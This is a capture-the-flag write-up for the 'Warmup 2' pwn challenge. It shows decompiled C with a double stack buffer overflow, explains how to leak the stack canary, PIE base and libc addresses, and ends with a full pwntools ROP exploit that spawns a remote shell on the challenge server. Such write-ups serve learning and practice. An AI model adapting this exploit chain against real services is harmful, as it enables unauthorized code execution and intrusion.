# Warmup 2

```
score: 50
solved: xx
difficulty: easy
tags: pwn, bof
```

# Challege

Having `libc6_2.31-0ubuntu9.8_amd64.so`

Have checksec result:
<pre>    Arch:     amd64-64-little
    RELRO:    <font color="#4E9A06">Full RELRO</font>
    Stack:    <font color="#4E9A06">Canary found</font>
    NX:       <font color="#4E9A06">NX enabled</font>
    PIE:      <font color="#4E9A06">PIE enabled</font>
</pre>

`main` function:
```c
undefined8 main(void)

{
  alarm(0x3c);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  vuln();
  return 0;
}
```

`vuln` function:
```c
void vuln(void)

{
  long in_FS_OFFSET;
  undefined local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What\'s your name?");
  read(0,local_118,0x1337);
  printf("Hello %s!\n",local_118);
  puts("How old are you?");
  read(0,local_118,0x1337);
  printf("Wow, I\'m %s too!\n",local_118);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

# Got the flag

Our aim is call `system("/bin/sh")` from `libc`. We have to leak somethings at here. We have 2 times for BOF in the `vuln` function. Follow steps to pwn:

1. Firstly, we will leak `Canary` and `rbp` before want to override anything. We will leak via make `local_118` fill and `Canary` and `saved rbp` will follow the string. Note that `Canary` have 0x00 at the lowest byte. Then, we override `return address` to return the `vuln` function calling in `main` and `rbp` with the leaked value function to have more BOF change to return more things.

2. Secondly, we will leak `libc` address via calling the ROP with stack struct to leak `puts` address in `libc`:
```
-------------------
pop rdi; ret
-------------------
address of puts@got
-------------------
puts@plt
-------------------
```
Do it again with `read` or `setbuf` or any function to leak 1 more `libc` address.

3. After having at least 2 address of libc's function. Try to search in [libc's database](https://libc.rip/) or [https://libc.blukat.me/](https://libc.blukat.me/) to find version of libc and offset of `system` function and `/bin/sh` strings.

4. Do manual call `system(/bin/sh)` or finding base address and using `one_gadget` for `libc` file and call it.

# Exploit poc

With noob level of code:
```py
from pwn import *
import time

elf = ELF("./chal")
# p = process(elf.path)
p = remote("warmup2.ctf.maplebacon.org",1337)
def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split(b"-")[0],16)

def debug(bp):
    script = "init-gef\n"
    PIE = get_PIE(p)
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(p,gdbscript=script)

def return_main():
    # return to main and can leak or exploit again:
    payload = b"A" *0x108
    payload += p64(canary)
    payload += p64(rbp_leak)
    payload += b"\xdd"
    p.send(payload)
    time.sleep(0.5)

def return_rop(rop):
    p.recv()
    payload = b"A"*0x108
    p.send(payload)
    time.sleep(0.5)
    p.recv()
    payload = b"A" *0x108
    payload += p64(canary)
    payload += p64(rbp_leak)
    payload += rop
    p.send(payload)
    time.sleep(0.5)

# debug([0x129d])

# for leak:
# leak canary + rbp
p.recv()
payload = b"A"*0x108
payload += b"`"
p.send(payload)
time.sleep(0.5)
leak = p.recv()
leak = leak[leak.find(b"`")+1:]
canary = leak[:7]
rbp_leak = leak[7:7+6]
canary = u64(canary.rjust(8,b"\x00"))
rbp_leak = u64(rbp_leak.ljust(8,b"\x00"))
log.success("Canary : {}".format(hex(canary)))
log.success("rbp: {}".format(hex(rbp_leak)))
time.sleep(0.5)
return_main()

# leak PIE:
p.recv()
payload = b"A" *0x108
payload += b"A" * 15
payload += b"`"
p.send(payload)
time.sleep(0.5)
leak = p.recv()
pie = leak[leak.find(b"`")+1:][:6]
pie = u64(pie.ljust(8, b"\x00")) - 0x12e2
elf.address = pie
log.success("PIE: {}".format(hex(pie)))
return_main()

# leak libc:
log.info("Starting leak libc...")
pop_rdi = 0x1353
pop_rsi_r15 = 0x1351
rop = b""
rop += p64(pie + pop_rdi)
rop += p64(elf.got.setbuf)
rop += p64(elf.plt.puts)
rop += p64(elf.symbols.vuln)
return_rop(rop)
p.recvuntil(b"\n")
x = p.recvn(6)
read_libc = u64(x[:6].ljust(8,b"\x00"))
log.success("libc setbuf: {}".format(hex(read_libc)))
rop = b""
rop += p64(pie + pop_rdi)
rop += p64(elf.got.puts)
rop += p64(elf.plt.puts)
rop += p64(elf.symbols.vuln)
return_rop(rop)
p.recvuntil(b"\n")
x = p.recvn(6)
puts_libc = u64(x[:6].ljust(8,b"\x00"))
log.success("libc puts: {}".format(hex(puts_libc)))
rop = b""
rop += p64(pie + pop_rdi)
rop += p64(elf.got.read)
rop += p64(elf.plt.puts)
rop += p64(elf.symbols.vuln)
return_rop(rop)
p.recvuntil(b"\n")
x = p.recvn(6)
read_libc = u64(x[:6].ljust(8,b"\x00"))
log.success("libc read: {}".format(hex(read_libc)))
# system_libc = read_libc - 0x10dfc0 + 0x52290
# str_bin_sh = read_libc - 0x10dfc0 + 0x1b45bd
# system_libc = read_libc - 0x10dff0 + 0x522c0
# str_bin_sh = read_libc - 0x10dff0 + 0x1b45bd
gadget = read_libc - 0x10dfc0 + 0xe3b01
rop = b""
rop += p64(gadget)
# rop += p64(pie + pop_rdi)
# rop += p64(str_bin_sh)
# rop += p64(system_libc)
return_rop(rop)

p.interactive()
```
